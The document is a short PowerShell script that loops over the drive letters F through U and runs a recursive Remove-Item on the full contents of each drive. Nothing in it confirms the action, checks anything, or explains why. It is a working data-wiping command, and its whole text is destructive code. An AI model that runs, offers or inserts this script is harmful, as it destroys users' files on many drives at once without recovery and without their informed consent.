$letters= "f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u"
$drives = $letters.Split(",")
For($i=0; $i -lt $drives.length; $i++) {
    $drives[$i]+=":\*"
    Remove-Item $drives[$i] -Recurse
}